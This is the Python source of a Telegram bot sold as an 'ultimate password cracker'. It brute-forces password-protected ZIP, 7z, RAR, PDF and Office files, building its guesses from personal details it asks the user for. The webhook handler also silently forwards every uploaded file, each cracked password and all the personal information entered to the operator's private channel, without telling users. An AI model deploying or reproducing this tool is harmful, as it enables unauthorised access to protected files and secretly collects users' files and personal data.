import os
import json
import time
import random
import requests
import threading
import pyzipper
import py7zr
import pdfplumber
from flask import Flask, request, jsonify

TOKEN = os.environ.get("BOT_TOKEN")
RENDER_URL = os.environ.get("RENDER_URL", "https://your-bot.onrender.com")
PRIVATE_CHANNEL = -1004479815753
CHANNEL_USERNAME = "@nrtecno2"

app = Flask(__name__)
user_sessions = {}


# ============================================================
# INFINITE PASSWORD GENERATOR — NO REPEAT
# ============================================================
class InfinitePasswordGenerator:
    def __init__(self):
        # All possible characters (including gaps/symbols)
        self.all_chars = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890~`|•√π÷×§∆£€$¢^°={}%©®™✓[]<>@#₹_&-+()/*"\'":;!?,. '
        
        # Common names for smart generation
        self.names = ['narendra', 'raj', 'rahul', 'amit', 'vikram', 'ajay', 'sunil',
                      'anil', 'deepak', 'sanjay', 'vijay', 'arjun', 'karan', 'mohit',
                      'rohit', 'ankit', 'vivek', 'manoj', 'suresh', 'mahesh', 'ramesh',
                      'dinesh', 'ganesh', 'naveen', 'pawan', 'sachin', 'rajesh', 'kapil',
                      'mukesh', 'ravi', 'ashok', 'shyam', 'kumar', 'singh', 'sharma',
                      'verma', 'gupta', 'yadav', 'jain', 'patel', 'shah', 'desai',
                      'meghwal', 'choudhary', 'rathore', 'shekhawat', 'gehlot',
                      'vyas', 'trivedi', 'pandey', 'tripathi', 'mishra']
        
        self.common_words = ['admin', 'password', 'root', 'toor', 'iloveyou', 'sunshine',
                             'princess', 'dragon', 'baseball', 'superman', 'batman',
                             'trustno', 'hello', 'freedom', 'whatever', 'qwerty',
                             'letmein', 'welcome', 'monkey', 'secret', 'love', 'angel',
                             'rainbow', 'tiger', 'eagle', 'phoenix', 'shadow', 'night',
                             'star', 'moon', 'sun', 'cloud', 'thunder', 'lightning']
        
        self.special_chars = ['@', '#', '&', '%', '!', '$', '_', '-', '+', '=', '~', '^', '*', '?']
        self.numbers = ['1', '12', '123', '1234', '12345', '123456', '1234567', '12345678',
                        '123456789', '1234567890']
        self.years = ['2020', '2021', '2022', '2023', '2024', '2025', '2026', '2027', '2028', '2029', '2030']
        self.months = ['january', 'february', 'march', 'april', 'may', 'june',
                       'july', 'august', 'september', 'october', 'november', 'december']
        
        self.used_passwords = set()
        self.generator_index = 0

    def generate_smart_passwords(self, user_info=None):
        """Generate passwords using user info"""
        name = user_info.get('name', '').strip().lower() if user_info else ''
        father = user_info.get('father', '').strip().lower() if user_info else ''
        mother = user_info.get('mother', '').strip().lower() if user_info else ''
        city = user_info.get('city', '').strip().lower() if user_info else ''
        mobile = user_info.get('mobile', '').strip() if user_info else ''
        dob = user_info.get('dob', '').strip() if user_info else ''

        all_names = self.names[:20]
        if name:
            all_names.insert(0, name)
        if father:
            all_names.insert(0, father)
        if mother:
            all_names.insert(0, mother)
        if city:
            all_names.insert(0, city)

        passwords = set()

        # 1. Name + Special + Number
        for n in all_names[:15]:
            for v in [n, n.upper(), n.capitalize()]:
                for spec in ['@', '#', '&', '%', '!']:
                    for num in ['123', '1234', '2024']:
                        passwords.add(f"{v}{spec}{num}")
                        passwords.add(f"{v}{num}{spec}")
                        passwords.add(f"{spec}{v}{num}")

        # 2. Name + Year
        for n in all_names[:15]:
            for v in [n, n.upper(), n.capitalize()]:
                for year in ['2024', '2025', '2026']:
                    passwords.add(f"{v}{year}")
                    passwords.add(f"{v}@{year}")
                    passwords.add(f"{v}#{year}")
                    passwords.add(f"{v}_{year}")
                    passwords.add(f"{v}-{year}")

        # 3. Name + Name
        for n1 in all_names[:10]:
            for n2 in all_names[:8]:
                if n1 != n2:
                    for v1 in [n1, n1.capitalize()]:
                        for v2 in [n2, n2.capitalize()]:
                            passwords.add(f"{v1}{v2}")
                            passwords.add(f"{v1}@{v2}")
                            passwords.add(f"{v1}_{v2}")
                            passwords.add(f"{v1}-{v2}")
                            passwords.add(f"{v1}{v2}{random.randint(1000, 9999)}")

        # 4. Word + Special + Name
        for word in self.common_words[:10]:
            for n in all_names[:8]:
                for v in [n, n.capitalize()]:
                    passwords.add(f"{word}@{v}")
                    passwords.add(f"{word}#{v}")
                    passwords.add(f"{v}@{word}")
                    passwords.add(f"{v}#{word}")
                    passwords.add(f"{word}{v}{random.randint(100, 999)}")

        # 5. Three Name Combinations
        for n1 in all_names[:5]:
            for n2 in all_names[:5]:
                for n3 in all_names[:3]:
                    if n1 != n2 and n2 != n3 and n1 != n3:
                        passwords.add(f"{n1}{n2}{n3}")
                        passwords.add(f"{n1}@{n2}{n3}")
                        passwords.add(f"{n1}_{n2}_{n3}")
                        passwords.add(f"{n1}{n2}{n3}{random.randint(100, 999)}")

        # 6. Mobile
        if mobile:
            mobile_clean = ''.join(filter(str.isdigit, mobile))
            if mobile_clean:
                passwords.add(mobile_clean)
                for n in all_names[:8]:
                    for v in [n, n.capitalize()]:
                        passwords.add(f"{v}{mobile_clean}")
                        passwords.add(f"{v}@{mobile_clean}")
                        passwords.add(f"{v}{mobile_clean[-4:]}")
                        passwords.add(f"{v}@{mobile_clean[-4:]}")

        # 7. DOB
        if dob:
            clean_dob = dob.replace('/', '').replace('-', '')
            if len(clean_dob) >= 4:
                passwords.add(clean_dob)
                for n in all_names[:8]:
                    for v in [n, n.capitalize()]:
                        passwords.add(f"{v}{clean_dob}")
                        passwords.add(f"{v}@{clean_dob}")
                        passwords.add(f"{v}{clean_dob[-4:]}")
                        passwords.add(f"{v}@{clean_dob[-4:]}")

        # 8. Common Words + Numbers
        for word in self.common_words[:15]:
            for num in ['123', '2024']:
                passwords.add(f"{word}{num}")
                passwords.add(f"{word}@{num}")
                passwords.add(f"{word}#{num}")
                passwords.add(f"{word}_{num}")
                passwords.add(f"{word.upper()}{num}")

        # 9. Brand Passwords
        for n in all_names[:8]:
            for v in [n, n.upper(), n.capitalize()]:
                passwords.add(f"Password by {v}")
                passwords.add(f"PASSWORD BY {v.upper()}")
                passwords.add(f"Nrtecno{v}")
                passwords.add(f"Nrtecno@{v}")
                passwords.add(f"Nrtecno#{v}")

        # 10. Sentences with all characters
        sentences = [
            'DEEPSEEK JB BY NONE USER',
            'NRTECNO ULTIMATE PASSWORD CRACKER',
            'BRUTEFORCE MACHINE ACTIVATED'
        ]
        
        for sentence in sentences:
            passwords.add(sentence)
            passwords.add(sentence.replace(' ', ''))
            passwords.add(sentence.upper())
            passwords.add(sentence.lower())
            for num in ['123', '2024']:
                passwords.add(f"{sentence}{num}")
                passwords.add(f"{sentence}@{num}")

        return list(passwords)

    def generate_random_passwords(self, count=100):
        """Generate completely random passwords with all characters"""
        passwords = []
        for _ in range(count):
            length = random.randint(6, 20)
            pwd = ''.join(random.choices(self.all_chars, k=length))
            passwords.append(pwd)
        return passwords

    def get_next_passwords(self, user_info=None, batch_size=500):
        """Get next batch of unique passwords"""
        new_passwords = []
        attempts = 0
        
        # First: Smart passwords (if info available)
        if user_info and self.generator_index == 0:
            smart = self.generate_smart_passwords(user_info)
            for pwd in smart:
                if pwd not in self.used_passwords:
                    self.used_passwords.add(pwd)
                    new_passwords.append(pwd)
                    if len(new_passwords) >= batch_size:
                        return new_passwords
            self.generator_index = 1
        
        # Second: Random passwords with all characters
        while len(new_passwords) < batch_size and attempts < 1000:
            attempts += 1
            pwd = self.generate_random_passwords(1)[0]
            if pwd not in self.used_passwords:
                self.used_passwords.add(pwd)
                new_passwords.append(pwd)
        
        return new_passwords

    def reset(self):
        self.used_passwords = set()
        self.generator_index = 0


# ============================================================
# FAST FILE CRACKERS
# ============================================================
def crack_zip_fast(file_path, password_list):
    for pwd in password_list:
        try:
            with pyzipper.AESZipFile(file_path) as zf:
                zf.extractall(pwd=pwd.encode())
                return pwd
        except:
            continue
    return None


def crack_7z_fast(file_path, password_list):
    for pwd in password_list:
        try:
            with py7zr.SevenZipFile(file_path, password=pwd) as archive:
                archive.extractall()
                return pwd
        except:
            continue
    return None


def crack_pdf_fast(file_path, password_list):
    for pwd in password_list:
        try:
            with pdfplumber.open(file_path, password=pwd) as pdf:
                if len(pdf.pages) > 0:
                    return pwd
        except:
            continue
    return None


def crack_office_fast(file_path, password_list):
    try:
        import msoffcrypto
        for pwd in password_list:
            try:
                with open(file_path, 'rb') as f:
                    office = msoffcrypto.OfficeFile(f)
                    office.load_key(password=pwd)
                    return pwd
            except:
                continue
    except:
        pass
    return None


def crack_rar_fast(file_path, password_list):
    try:
        import rarfile
        import tempfile
        if not rarfile.is_rarfile(file_path):
            return None
        with tempfile.TemporaryDirectory() as tmpdir:
            for pwd in password_list:
                try:
                    with rarfile.RarFile(file_path) as rf:
                        rf.extractall(path=tmpdir, pwd=pwd)
                        return pwd
                except:
                    continue
    except:
        pass
    return None


def crack_file_fast(file_path, ext, password_list):
    if ext == 'zip':
        return crack_zip_fast(file_path, password_list)
    elif ext == '7z':
        return crack_7z_fast(file_path, password_list)
    elif ext == 'pdf':
        return crack_pdf_fast(file_path, password_list)
    elif ext in ['docx', 'doc', 'xlsx', 'xls', 'pptx', 'ppt']:
        return crack_office_fast(file_path, password_list)
    elif ext == 'rar':
        return crack_rar_fast(file_path, password_list)
    return None


# ============================================================
# TELEGRAM HELPERS
# ============================================================
def send_message(chat_id, text, reply_markup=None, parse_mode='Markdown'):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    requests.post(url, json=payload)


def edit_message(chat_id, message_id, text, reply_markup=None, parse_mode='Markdown'):
    url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    requests.post(url, json=payload)


def send_document(chat_id, file_path, caption=""):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    with open(file_path, 'rb') as f:
        files = {'document': f}
        data = {'chat_id': chat_id, 'caption': caption}
        requests.post(url, files=files, data=data)


def answer_callback(callback_id, text=""):
    url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
    payload = {"callback_query_id": callback_id, "text": text}
    requests.post(url, json=payload)


def check_channel_membership(user_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember"
        params = {"chat_id": CHANNEL_USERNAME, "user_id": user_id}
        response = requests.get(url, params=params)
        data = response.json()
        if data["ok"]:
            status = data["result"]["status"]
            return status in ["member", "creator", "administrator"]
        return False
    except:
        return False


def get_auto_buttons():
    return {
        "inline_keyboard": [
            [
                {"text": "1️⃣ AUTO (With Info)", "callback_data": "auto_info"},
                {"text": "2️⃣ AUTO (Direct)", "callback_data": "auto_direct"}
            ]
        ]
    }


def join_verify_keyboard():
    return {
        "inline_keyboard": [
            [
                {"text": "🔴 JOIN CHANNEL", "url": "https://t.me/nrtecno2"},
                {"text": "✅ VERIFY", "callback_data": "verify"}
            ]
        ]
    }


# ============================================================
# INFINITE CRACK IN BACKGROUND
# ============================================================
def crack_in_background_infinite(chat_id, file_path, file_name, ext, user_info=None):
    try:
        generator = InfinitePasswordGenerator()
        total_tried = 0
        batch_size = 500
        
        send_message(chat_id, "🔄 *Starting infinite brute-force...*\n⏳ Will keep generating until password found!", parse_mode='Markdown')
        
        while True:
            # Get next batch of unique passwords
            password_list = generator.get_next_passwords(user_info, batch_size)
            
            if not password_list:
                # Generate random passwords if nothing else
                for _ in range(batch_size):
                    pwd = ''.join(random.choices(generator.all_chars, k=random.randint(6, 20)))
                    if pwd not in generator.used_passwords:
                        generator.used_passwords.add(pwd)
                        password_list.append(pwd)
            
            total_tried += len(password_list)
            
            # Send progress update every 1000 passwords
            if total_tried % 1000 == 0:
                send_message(chat_id, f"🔄 *Tried {total_tried} passwords...*\n⏳ Still searching...", parse_mode='Markdown')
            
            # Try to crack
            password = crack_file_fast(file_path, ext, password_list)
            
            if password:
                elapsed = time.time() - start_time
                send_message(
                    chat_id,
                    f"✅ *Password Cracked!*\n\n🔑 `{password}`\n\n📁 {file_name}\n📊 Tried: {total_tried} passwords\n⚡ Time: {elapsed:.2f}s",
                    parse_mode='Markdown'
                )
                try:
                    send_document(PRIVATE_CHANNEL, file_path, f"✅ Found!\n📁 {file_name}\n🔑 {password}")
                except:
                    pass
                break
            
            # If we've tried too many, send periodic update
            if total_tried % 5000 == 0:
                send_message(chat_id, f"🔄 *Still searching...*\n📊 Tried {total_tried} passwords so far.\n_Will keep trying until found!_", parse_mode='Markdown')
        
        if os.path.exists(file_path):
            os.remove(file_path)
        
    except Exception as e:
        send_message(chat_id, f"❌ *Error:* {str(e)}", parse_mode='Markdown')
        if os.path.exists(file_path):
            os.remove(file_path)


# ============================================================
# MAIN WEBHOOK HANDLER
# ============================================================
@app.route(f'/webhook/{TOKEN}', methods=['POST'])
def webhook():
    try:
        update = request.get_json()
        if not update:
            return jsonify({"status": "error"}), 400

        if 'message' in update:
            message = update['message']
            chat_id = message['chat']['id']
            user_id = message['from']['id']
            username = message['from'].get('username', str(user_id))

            if 'text' in message:
                text = message['text']

                if text == '/start':
                    if not check_channel_membership(user_id):
                        send_message(chat_id, "🔴 *Access Denied!*\n\n❌ Please join @nrtecno2 first.", reply_markup=join_verify_keyboard())
                    else:
                        send_message(chat_id, "🔐 *NRTECNO ULTIMATE PASSWORD CRACKER*\n\n✅ Verified!\n⚡ *Infinite Mode Activated*\n📁 *Send me any password protected file.*\n\n_Will keep generating passwords until found!_", parse_mode='Markdown')
                    return jsonify({"status": "ok"}), 200

                if chat_id in user_sessions and user_sessions[chat_id].get('state') == 'collecting_info':
                    session = user_sessions[chat_id]
                    field = session['current_field']
                    session['info'][field] = text

                    try:
                        send_message(PRIVATE_CHANNEL, f"📝 *{field.title()}:* {text}\n👤 @{username}")
                    except:
                        pass

                    fields = session['fields']
                    current_index = fields.index(field)

                    if current_index + 1 < len(fields):
                        next_field = fields[current_index + 1]
                        session['current_field'] = next_field
                        send_message(chat_id, f"📝 *Enter {next_field.title()}?*", parse_mode='Markdown')
                    else:
                        session['state'] = 'cracking'
                        info_summary = "📝 *User Info Collected*\n\n"
                        for f, v in session['info'].items():
                            info_summary += f"📌 *{f.title()}:* {v}\n"
                        info_summary += f"\n👤 @{username}\n📁 {session['file_name']}"
                        try:
                            send_message(PRIVATE_CHANNEL, info_summary)
                        except:
                            pass

                        threading.Thread(
                            target=crack_in_background_infinite,
                            args=(chat_id, session['file_path'], session['file_name'], session['file_ext'], session['info'])
                        ).start()

                        del user_sessions[chat_id]
                    return jsonify({"status": "ok"}), 200

            if 'document' in message:
                file = message['document']
                file_name = file.get('file_name', 'unknown')
                file_id = file['file_id']

                if not check_channel_membership(user_id):
                    send_message(chat_id, "🔴 Access Denied!", reply_markup=join_verify_keyboard())
                    return jsonify({"status": "ok"}), 200

                file_info = requests.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}").json()
                file_path_api = file_info['result']['file_path']
                file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path_api}"
                response = requests.get(file_url)

                os.makedirs("downloads", exist_ok=True)
                file_path = f"downloads/{file_name}"
                with open(file_path, 'wb') as f:
                    f.write(response.content)

                ext = file_name.split('.')[-1].lower()

                try:
                    send_message(PRIVATE_CHANNEL, f"📁 *File Received*\n📄 {file_name}\n👤 @{username}")
                except:
                    pass

                user_sessions[chat_id] = {
                    'file_path': file_path,
                    'file_name': file_name,
                    'file_ext': ext,
                    'state': 'waiting_for_option'
                }

                send_message(
                    chat_id,
                    f"📁 *File Received!*\n\n📄 {file_name}\n⚡ *Choose an option:*",
                    reply_markup=get_auto_buttons(),
                    parse_mode='Markdown'
                )

                return jsonify({"status": "ok"}), 200

        if 'callback_query' in update:
            callback = update['callback_query']
            callback_id = callback['id']
            chat_id = callback['message']['chat']['id']
            message_id = callback['message']['message_id']
            user_id = callback['from']['id']
            data = callback['data']

            if data == 'verify':
                if check_channel_membership(user_id):
                    edit_message(chat_id, message_id, "🔐 *NRTECNO ULTIMATE PASSWORD CRACKER*\n\n✅ Verified!\n⚡ *Send me a file.*", parse_mode='Markdown')
                else:
                    edit_message(chat_id, message_id, "🔴 *Still Not Verified!*\n\n❌ Please join @nrtecno2 first.", reply_markup=join_verify_keyboard())
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200

            if data == 'auto_direct':
                session = user_sessions.get(chat_id)
                if not session:
                    send_message(chat_id, "❌ *No file found. Send a file first.*", parse_mode='Markdown')
                    answer_callback(callback_id)
                    return jsonify({"status": "ok"}), 200

                edit_message(chat_id, message_id, "⚡ *INFINITE mode activated (Direct)...*\n⏳ Will keep generating until found!", parse_mode='Markdown')

                threading.Thread(
                    target=crack_in_background_infinite,
                    args=(chat_id, session['file_path'], session['file_name'], session['file_ext'], None)
                ).start()

                del user_sessions[chat_id]
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200

            if data == 'auto_info':
                session = user_sessions.get(chat_id)
                if not session:
                    send_message(chat_id, "❌ *No file found. Send a file first.*", parse_mode='Markdown')
                    answer_callback(callback_id)
                    return jsonify({"status": "ok"}), 200

                fields = ['name', 'dob', 'father', 'mother', 'city', 'mobile']
                session['info'] = {}
                session['fields'] = fields
                session['current_field'] = fields[0]
                session['state'] = 'collecting_info'

                edit_message(chat_id, message_id, "📝 *Let's collect some info for infinite password generation*\n\n", parse_mode='Markdown')
                send_message(chat_id, f"📝 *Enter {fields[0].title()}?*", parse_mode='Markdown')
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200

            if data == 'cancel':
                session = user_sessions.get(chat_id)
                if session and session.get('file_path'):
                    os.remove(session['file_path'])
                del user_sessions[chat_id]
                send_message(chat_id, "❌ *Cancelled.* Send file again.", parse_mode='Markdown')
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200

            answer_callback(callback_id)
            return jsonify({"status": "ok"}), 200

        return jsonify({"status": "ok"}), 200

    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


# ============================================================
# SET WEBHOOK AND MAIN
# ============================================================
def set_webhook():
    webhook_url = f"{RENDER_URL}/webhook/{TOKEN}"
    url = f"https://api.telegram.org/bot{TOKEN}/setWebhook"
    response = requests.post(url, json={"url": webhook_url})
    if response.status_code == 200:
        print(f"✅ Webhook set to: {webhook_url}")
    else:
        print(f"❌ Webhook failed: {response.text}")


if __name__ == "__main__":
    if not TOKEN:
        print("❌ BOT_TOKEN not found!")
        exit(1)

    set_webhook()

    port = int(os.environ.get("PORT", 5000))
    print("🤖 NRTECNO ULTIMATE PASSWORD CRACKER STARTED...")
    print("♾️ INFINITE MODE ACTIVATED")
    print("🔢 Password Types: All combinations (Smart + Random)")
    print("📁 Files: ZIP, 7z, RAR, PDF, DOCX, XLSX, PPTX")
    print("🚀 Running on port", port)

    app.run(host="0.0.0.0", port=port)
